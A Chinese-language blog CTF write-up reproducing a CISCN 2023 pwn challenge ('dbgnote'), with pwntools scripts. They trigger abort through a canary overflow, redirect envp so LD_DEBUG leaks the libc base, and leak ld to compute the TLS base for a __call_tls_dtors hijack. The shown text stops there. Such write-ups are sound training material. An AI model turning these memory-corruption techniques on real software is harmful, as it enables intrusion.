<h3 id="break-1"><span class="me-2">Break</span><a href="#break-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>‍</p>

<ul>
  <li>程序基本就是上面那样，我也是跟着其他大佬的wp 做的，我们直接讲一下关键点</li>
</ul>

<p>‍</p>

<ul>
  <li>想要触发 dbg 模式 我们就需要 程序发出SIGABRT 6 ,  SIGABRT 6 的触发也就是由abort(3)发出的退出指令</li>
  <li>什么可以触发abort(3) 呢？，没错 就是栈溢出。</li>
</ul>

<blockquote>
  <p>SIGABRT 6 C 由abort(3)发出的退出指令</p>
</blockquote>

<p>‍</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">s</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sa</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">sl</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">sla</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">delim</span><span class="p">,</span><span class="n">data</span>         <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">delim</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
<span class="n">r</span>       <span class="o">=</span> <span class="k">lambda</span> <span class="n">num</span>                <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
<span class="n">ru</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span>  <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="n">delims</span><span class="p">,</span> <span class="n">drop</span><span class="p">)</span>
<span class="n">itr</span>     <span class="o">=</span> <span class="k">lambda</span>                    <span class="p">:</span><span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
<span class="n">uu32</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u32</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">uu64</span>    <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="nf">u64</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">ls</span>      <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span>               <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="n">lss</span>     <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span>                  <span class="p">:</span><span class="n">log</span><span class="p">.</span><span class="nf">success</span><span class="p">(</span><span class="sh">'</span><span class="se">\033</span><span class="s">[1;31;40m%s --&gt; 0x%x </span><span class="se">\033</span><span class="s">[0m</span><span class="sh">'</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nf">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span>      <span class="o">=</span> <span class="sh">'</span><span class="s">amd64</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">'</span><span class="s">debug</span><span class="sh">'</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span>  <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">tmux</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">splitw</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-h</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">-l</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">130</span><span class="sh">'</span><span class="p">]</span>
<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">args</span><span class="p">.</span><span class="n">RE</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">remote</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">binary</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>

<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
brva 0x01500
</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>

<span class="n">binary</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./dbgnote</span><span class="sh">'</span>
<span class="n">libelf</span> <span class="o">=</span> <span class="sh">''</span>

<span class="nf">if </span><span class="p">(</span><span class="n">binary</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">elf</span>  <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span> <span class="p">;</span> <span class="n">rop</span><span class="o">=</span><span class="nc">ROP</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="nf">if </span><span class="p">(</span><span class="n">libelf</span><span class="o">!=</span><span class="sh">''</span><span class="p">):</span> <span class="n">libc</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="n">libelf</span><span class="p">)</span>

<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">(</span><span class="n">binary</span><span class="p">,[</span><span class="sh">'</span><span class="s">run</span><span class="sh">'</span><span class="p">])</span>
<span class="c1">#io = remote()
</span>

<span class="n">nl</span> <span class="o">=</span> <span class="p">[</span><span class="sh">'</span><span class="s">Note_Add</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Note_Delete</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Note_Write</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">Note_Read</span><span class="sh">'</span><span class="p">,</span><span class="sa">b</span><span class="sh">'</span><span class="s">++--++--</span><span class="sh">'</span><span class="p">]</span>

<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">UserName: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Size: </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Note: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">s</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">rm</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Index: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="n">text</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Index: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Note: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">"</span><span class="s">Index: </span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
<span class="k">def</span> <span class="nf">gift</span><span class="p">(</span><span class="n">e</span><span class="o">=</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">):</span>
    <span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
    <span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">+</span><span class="n">e</span><span class="p">)</span>

<span class="nf">login</span><span class="p">(</span><span class="sh">'</span><span class="s">my_name</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Size: </span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#gdb.attach(io)
</span><span class="nf">s</span><span class="p">(</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x19</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<ul>
  <li>进入 <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code>​ 就会调用 <code class="language-plaintext highlighter-rouge">abort(3)</code>​</li>
</ul>

<p>​​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112010-ldekucv.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112010-ldekucv.png" alt="image" loading="lazy"></a>​​</p>

<p>‍</p>

<p>继续执行的话，直接就可以触发 dbg 模式</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112138-ve052v5.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112138-ve052v5.png" alt="image" loading="lazy"></a>​</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112318-cydiiuy.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112318-cydiiuy.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>进入dbg 模式了</li>
</ul>

<p><a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112605-7xy7qg7.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112605-7xy7qg7.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>虽然进入dbg 模式了，但是 由于程序有 PIE ，想利用任意读任意写功能都是梦，</li>
  <li>所以该这么泄露地址呢？这就需要利用 环境变量了，下图里的envp 指针是可以通过buf 溢出修改的</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112318-cydiiuy.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113112318-cydiiuy.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>测试代码</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre><span class="nf">login</span><span class="p">(</span><span class="sh">'</span><span class="s">my_name</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x32</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Size: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x19</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113113639-6z29ge6.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113113639-6z29ge6.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>也就是说可以控制 envp 的指针，具体指向哪呢，怎么利用呢？继续看</li>
</ul>

<p><a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113113715-m7quyza.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113113715-m7quyza.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>有个东西叫 <code class="language-plaintext highlighter-rouge">LD_DEBUG</code>​ ,  只要环境变量里有 <code class="language-plaintext highlighter-rouge">LD_DEBUG=files</code>​ 就可以在执行程序的时候 输出下面的那一坨东西 debug信息</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113114116-b69x6sm.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113114116-b69x6sm.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>​<code class="language-plaintext highlighter-rouge">LD_DEBUG</code>​ help</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113114222-blqshjp.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113114222-blqshjp.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<p>‍</p>

<ul>
  <li>利用 gift 泄露 stack 低16 位 ，泄露的地址 <code class="language-plaintext highlighter-rouge">+ 0x1c</code>​ 也就是 我们 name 的低 16 位，可以把 envp 的低 16 位改成 name 的地址，这样我们的 envp 的内容就可以通过 name 来控制</li>
</ul>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113114751-fhjxfzf.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113114751-fhjxfzf.png" alt="image" loading="lazy"></a>​</p>

<ul>
  <li>然后继续运行就会 有这一坨调试数据</li>
</ul>

<p><a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113114814-bdh0k1r.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113114814-bdh0k1r.png" alt="image" loading="lazy"></a></p>

<ul>
  <li>接受 libc_base</li>
</ul>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="nf">login</span><span class="p">(</span><span class="sh">'</span><span class="s">LD_DEBUG=all</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="sh">'</span><span class="s">tttttt</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#login('run\x00')
</span><span class="nf">gift</span><span class="p">()</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Super note: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span>  <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">))</span>
<span class="n">name</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="mh">0x1c</span>
<span class="nf">ls</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">)</span>


<span class="n">pay</span> <span class="o">=</span> <span class="mi">6</span> <span class="o">*</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p16</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>



<span class="c1">#gdb.attach(io,'brva 0x000017E4')
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Size: </span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#gdb.attach(io)
</span><span class="nf">s</span><span class="p">(</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x19</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">base: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">18</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">[Addr] </span><span class="sh">'</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="c1"># _GLOBAL_OFFSET_TABLE_
</span><span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>‍</p>

<ul>
  <li>最后是 exit(0) 退出，打 IO 的话 0x90 应该不够用. pass</li>
  <li>由于是高版本。传统的 exit_hook 打 <code class="language-plaintext highlighter-rouge">_rtld_global</code>​ 不可用. pass</li>
  <li>高版本下可以利用 劫持 tls 段内容 来控制 <code class="language-plaintext highlighter-rouge">__call_tls_dtors</code>​ ，</li>
</ul>

<p>​<code class="language-plaintext highlighter-rouge">exit</code>​ -&gt; <code class="language-plaintext highlighter-rouge">__run_exit_handlers</code>​ -&gt; <code class="language-plaintext highlighter-rouge">__call_tls_dtors</code>​</p>

<p>‍</p>

<p>​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113120230-q2sefvs.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113120230-q2sefvs.png" alt="image" loading="lazy"></a>​</p>

<p>‍</p>

<ul>
  <li>通过这个地址 泄露 ld 上的地址</li>
</ul>

<p>​​<a href="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113121038-xaz1ysa.png" class="popup img-link  shimmer"><img src="/assets/img/2024-CTFWP-images/2023-01-24-CISCN 2023 华东北赛区 AWDPlus pwn 题复现/assets/image-20240113121038-xaz1ysa.png" alt="image" loading="lazy"></a>​​</p>

<p>‍</p>

<p>泄露 ld 地址 计算 tls</p>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="已复制！"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre><span class="nf">login</span><span class="p">(</span><span class="sh">'</span><span class="s">LD_DEBUG=all</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">add</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span><span class="sh">'</span><span class="s">tttttt</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#login('run\x00')
</span><span class="nf">gift</span><span class="p">()</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Super note: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span>  <span class="nf">int</span><span class="p">(</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">))</span>
<span class="n">name</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="mh">0x1c</span>
<span class="nf">ls</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">name</span><span class="sh">'</span><span class="p">)</span>


<span class="n">pay</span> <span class="o">=</span> <span class="mi">6</span> <span class="o">*</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p16</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">pay</span><span class="p">)</span>



<span class="c1">#gdb.attach(io,'brva 0x000017E4')
</span><span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">@Note $ </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">sl</span><span class="p">(</span><span class="n">nl</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">Size: </span><span class="sh">'</span><span class="p">)</span>
<span class="c1">#gdb.attach(io)
</span><span class="nf">s</span><span class="p">(</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x19</span><span class="p">)</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">base: </span><span class="sh">'</span><span class="p">)</span>
<span class="n">libc_base</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">18</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
<span class="n">ld_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mi">2203664</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">libc_base</span><span class="sh">'</span><span class="p">)</span>
<span class="nf">lss</span><span class="p">(</span><span class="sh">'</span><span class="s">ld_addr</span><span class="sh">'</span><span class="p">)</span>

<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">[Addr] </span><span class="sh">'</span><span class="p">)</span>
<span class="nf">s</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="n">ld_addr</span><span class="p">))</span>
<span class="nf">ru</span><span class="p">(</span><span class="sh">'</span><span class="s">[Read] </span><span class="sh">'</span><span class="p">)</span>
<span class="n">ld</span> <span class="o">=</span> <span class="nf">uu64</span><span class="p">(</span><span class="nf">r</span><span class="p">(</span><span class="mi">6</span><span class="p">))</span>
<span class="n">ld_base</span> <span class="o">=</span> <span class="n">ld</span> <span class="o">-</span> <span class="mi">89392</span>
<span class="n">tls_base</span> <span class="o">=</span> <span class="n">ld_base</span> <span class="o">-</span> <span class="mi">100544</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
